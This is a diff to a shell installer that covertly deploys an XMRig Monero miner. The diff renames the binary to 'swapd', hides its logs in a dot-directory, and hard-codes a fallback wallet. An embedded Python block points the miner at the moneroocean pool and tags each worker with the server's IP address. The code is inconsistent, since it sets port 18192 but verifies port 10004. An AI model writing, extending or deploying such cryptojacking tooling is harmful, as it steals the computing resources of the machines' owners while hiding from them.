@@ -1319,7 +1319,7 @@ echo "[*] #checking prerequisites..."
 # Make wallet optional with a default
 if [ -z "$WALLET" ]; then
   echo "[!] WARNING: No wallet address provided, using default wallet"
-  WALLET="4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
+  WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
   echo "[*] Using default wallet: $WALLET"
   echo "[*] To use your own wallet, run: $0 <your_wallet_address>"
   sleep 3
@@ -1713,17 +1713,8 @@ echo "[*] Miner "$HOME"/.swapd/xmrig is OK"
 echo "mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd"
 mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
 
-echo "sed"
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:80",/' "$HOME"/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'"$WALLET"'",/' "$HOME"/.swapd/config.json
-#sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' "$HOME"/.swapd/config.json
-#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME"/.swapd/config.json
-#sed -i 's#"log-file": *null,#"log-file": "'"$HOME"/.swapd/swapd.log'",#' "$HOME"/.swapd/config.json
-#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config.json
-#sed -i 's/"enabled": *[^,]*,/"enabled": true,/' "$HOME"/.swapd/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$HOME"/.swapd/config.json
+# NOTE: Config will be set by Python section below (sed doesn't work with pools array format)
+echo "[*] Binary renamed to swapd"
 
 echo "[*] Copying xmrig-proxy config"
 # ==================== ENABLE HIDDEN XMRIG LOGGING ====================
@@ -1748,16 +1739,55 @@ if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
             $PYTHON_CMD << PYEOF
 import json
 import sys
+import socket
+
+# Get server IP for pass field
+def get_server_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return socket.gethostname()
 
 try:
     with open('$config_file', 'r') as f:
         config = json.load(f)
     
-    # CRITICAL: Set wallet address (MUST BE SET CORRECTLY!)
-    config['user'] = '$WALLET'
+    server_ip = get_server_ip()
     
-    # CRITICAL: Set pool URL
-    config['url'] = 'gulf.moneroocean.stream:80'
+    # Check if config uses pools array format or flat format
+    if 'pools' in config and isinstance(config['pools'], list) and len(config['pools']) > 0:
+        # NEW FORMAT: pools array
+        print('[*] Detected pools array format')
+        
+        # Set wallet in first pool
+        config['pools'][0]['user'] = '$WALLET'
+        
+        # Set pool URL (PORT 18192 - CPU/GPU FARM - for multiple servers)
+        config['pools'][0]['url'] = 'gulf.moneroocean.stream:18192'
+        
+        # CRITICAL: Set pass to server IP (for worker identification)
+        config['pools'][0]['pass'] = server_ip
+        
+        # Ensure pool is enabled
+        config['pools'][0]['enabled'] = True
+        config['pools'][0]['keepalive'] = True
+        
+    else:
+        # OLD FORMAT: flat config
+        print('[*] Detected flat config format')
+        
+        # Set wallet
+        config['user'] = '$WALLET'
+        
+        # Set pool URL (PORT 18192 - CPU/GPU FARM - for multiple servers)
+        config['url'] = 'gulf.moneroocean.stream:18192'
+        
+        # CRITICAL: Set pass to server IP
+        config['pass'] = server_ip
     
     # CRITICAL: Set log file to hidden location
     config['log-file'] = '/root/.swapd/.swap_logs/.swap-history.bin'
@@ -1777,17 +1807,20 @@ try:
     
     # Enable log rotation to prevent huge files
     config['retries'] = 5
-    config['rotate-logs'] = True
-    config['rotate-files'] = 3
+    config['retry-pause'] = 5
     
     # Write back
     with open('$config_file', 'w') as f:
         json.dump(config, f, indent=4)
     
     print('[✓] Config updated successfully')
+    print('[✓] Wallet set to: $WALLET')
+    print('[✓] Pass (worker ID) set to:', server_ip)
     sys.exit(0)
 except Exception as e:
     print('[!] Error updating config:', str(e))
+    import traceback
+    traceback.print_exc()
     sys.exit(1)
 PYEOF
         fi
@@ -1806,8 +1839,8 @@ PYEOF
     fi
     
     # Verify pool was set
-    if grep -q 'gulf.moneroocean.stream' /root/.swapd/config.json 2>/dev/null; then
-        echo "[✓] Pool correctly set: gulf.moneroocean.stream:80"
+    if grep -q 'gulf.moneroocean.stream:10004' /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Pool correctly set: gulf.moneroocean.stream:10004"
     else
         echo "[!] ERROR: Pool NOT correctly set!"
     fi
